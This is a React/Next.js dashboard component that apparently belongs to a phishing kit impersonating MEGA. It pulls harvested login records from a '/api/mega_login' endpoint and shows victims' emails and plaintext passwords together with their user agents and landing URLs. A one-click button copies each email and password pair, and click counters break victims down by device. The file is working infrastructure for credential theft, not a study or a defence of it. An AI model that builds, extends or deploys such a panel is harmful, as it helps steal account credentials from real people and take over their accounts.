'use client';

import { useEffect, useState } from "react";
import { MdKeyboardArrowRight, MdKeyboardArrowLeft, MdContentCopy, MdArrowDownward, MdArrowUpward } from "react-icons/md";
import { FaRegArrowAltCircleRight } from "react-icons/fa";
import axios from "axios";
import { formatDistanceToNow } from "date-fns";
import toast from "react-hot-toast";
import { useRouter } from "next/navigation";
import Loader from "@/components/Loader";
import { isLoggedIn } from "../utils/auth";

const ActiveLinksTable = () => {
  const router = useRouter();
  const [currentPage, setCurrentPage] = useState(1);
  const [sortConfig, setSortConfig] = useState({ key: "id", direction: "ascending" });
  const [loading, setLoading] = useState(true);
  const [userDetails, setUserDetails] = useState([]);
  const [loginUser, setLoginUser] = useState(null);
  const [userName, setUserName] = useState(null);
  const [deviceCounts, setDeviceCounts] = useState({ mobile: 0, desktop: 0, tablet: 0, total: 0 });

  const itemsPerPage = 5;

  // Fetching data with Axios
  const fetchData = async () => {
    try {
      setLoading(true);
      const [loginDataRes, signupDataRes, countsRes] = await Promise.all([
        axios.get("/api/mega_login"),
        axios.get("/api/auth/signup"),
        axios.get("/api/get-visit-counts"),
      ]);

      const user = localStorage.getItem("login_user");
      const loginData = loginDataRes.data?.data || [];
      const signupData = signupDataRes.data || [];
      const countsData = countsRes.data || [];

      const filteredLoginData = loginData.filter((value) => value?.logEmail === user);
      setUserDetails(filteredLoginData);

      const foundUser = signupData.find((value) => value.email === user);
      setUserName(foundUser);

      const filteredCounts = countsData.filter((value) => value.email === user);
      let mobile = 0, desktop = 0, tablet = 0, total = 0;
      filteredCounts.forEach((item) => {
        mobile += item.deviceCounts?.mobile || 0;
        desktop += item.deviceCounts?.desktop || 0;
        tablet += item.deviceCounts?.tablet || 0;
      });
      total = mobile + desktop + tablet;
      setDeviceCounts({ mobile, desktop, tablet, total });
    } catch (error) {
      console.error("Error fetching data:", error);
      toast.error("Failed to fetch data");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!isLoggedIn()) {
      router.push("/");
    } else {
      fetchData();
    }
  }, []);

  const handlePageChange = (page) => {
    if (page >= 1 && page <= Math.ceil(userDetails?.length / itemsPerPage)) {
      setCurrentPage(page);
    }
  };

  const handleSort = (key) => {
    const direction = sortConfig.key === key && sortConfig.direction === "ascending" ? "descending" : "ascending";
    setSortConfig({ key, direction });

    const sortedData = [...userDetails].sort((a, b) => {
      if (a[key] < b[key]) return direction === "ascending" ? -1 : 1;
      if (a[key] > b[key]) return direction === "ascending" ? 1 : -1;
      return 0;
    });

    setUserDetails(sortedData);
  };

  const copyToClipboard = (value) => {
    navigator.clipboard.writeText(value).then(() => {
      toast.success(`Copied: ${value}`);
    });
  };

  if (loading) return <Loader />;

  const totalPages = Math.ceil(userDetails?.length / itemsPerPage);
  const startIndex = (currentPage - 1) * itemsPerPage;
  const currentItems = userDetails?.slice(startIndex, startIndex + itemsPerPage);

  return (
    <div className="p-4">
      <h3 className="pb-5 text-2xl font-normal text-gray-800">Dashboard</h3>

      {/* Device Counts Section */}
      <section className="flex items-center justify-between gap-5">
        {["Mobile Click", "Desktop Click", "Tablet Click", "Total Account"].map((title, index) => (
          <div className="w-full" key={index}>
            <div
              className={`flex justify-between rounded-md ${
                index === 0 ? "bg-cyan-600" : index === 1 ? "bg-[#28a745]" : index === 2 ? "bg-[#ffc107]" : "bg-[#dc3545]"
              }`}
            >
              <div className="flex flex-col w-full gap-1">
                <h1 className="px-4 pt-5 text-3xl font-bold text-white">{Object.values(deviceCounts)[index]}</h1>
                <p className="px-4 pb-6 text-white">{title}</p>
                <button
                  className={`flex items-center justify-center w-full gap-1 p-2 text-center text-white rounded-md ${
                    index === 0
                      ? "hover:bg-cyan-800 bg-cyan-700"
                      : index === 1
                      ? "hover:bg-[#196e2d] bg-[#1a7d31]"
                      : index === 2
                      ? "hover:bg-[#d1a72b] bg-yellow-400"
                      : "hover:bg-[#962934] bg-[#c92535]"
                  }`}
                >
                  More Info
                  <FaRegArrowAltCircleRight />
                </button>
              </div>
            </div>
          </div>
        ))}
      </section>

      {/* Data Table */}
      <div className="pt-10 overflow-x-auto rounded shadow-lg">
        <table className="min-w-full border border-collapse border-gray-300 rounded-lg">
          <thead>
            <tr className="text-left bg-gray-100">
              {["ID", "Site Name", "Name", "Email", "Password", "UserAgent", "Landing URL", "Time", "Copy"].map((title, index) => (
                <th
                  key={index}
                  className="px-4 py-2 border border-gray-300 cursor-pointer"
                  onClick={() => title !== "Copy" && handleSort(title.toLowerCase())}
                >
                  <span className="flex items-center justify-between">
                    {title}
                  
                  </span>
                </th>
              ))}
            </tr>
          </thead>
          <tbody>
            {currentItems?.length === 0 ? (
              <tr>
                <td colSpan="9" className="px-4 py-2 text-center text-gray-500 border border-gray-300">
                  No Data Available
                </td>
              </tr>
            ) : (
              currentItems.map((link, index) => (
                <tr key={link._id} className={`${index % 2 === 0 ? "bg-gray-100" : "bg-white"} hover:bg-gray-200`}>
                  <td className="px-4 py-2 border border-gray-300">{index + 1}</td>
                  <td className="px-4 py-2 border border-gray-300">Mega</td>
                  <td className="px-4 py-2 border border-gray-300">{userName?.name}</td>
                  <td className="px-4 py-2 border border-gray-300">{link?.email}</td>
                  <td className="px-4 py-2 border border-gray-300">{link?.password}</td>
                  <td className="px-4 py-2 border border-gray-300">{link?.userAgent}</td>
                  <td className="px-4 py-2 border border-gray-300">{link?.url?.split("?")[0]}</td>
                  <td className="px-4 py-2 border border-gray-300">{formatDistanceToNow(new Date(link?.createdAt), { addSuffix: true })}</td>
                  <td className="px-4 py-2 text-center border border-gray-300">
                    <button
                      onClick={() => copyToClipboard(link?.email + " " + link?.password)}
                      className="p-2 text-white bg-green-500 rounded hover:bg-green-600"
                    >
                      <MdContentCopy size={18} />
                    </button>
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>

      {/* Pagination */}
      {currentItems?.length > 0 && (
        <div className="flex items-center gap-4 mt-4">
          <button
            onClick={() => handlePageChange(currentPage - 1)}
            className={`${currentPage === 1 ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"} p-2 text-white rounded`}
            disabled={currentPage === 1}
          >
            <MdKeyboardArrowLeft size={20} />
          </button>
          <span>
            Page {currentPage} of {totalPages}
          </span>
          <button
            onClick={() => handlePageChange(currentPage + 1)}
            className={`${currentPage === totalPages ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"} p-2 text-white rounded`}
            disabled={currentPage === totalPages}
          >
            <MdKeyboardArrowRight size={20} />
          </button>
        </div>
      )}
    </div>
  );
};

export default ActiveLinksTable;
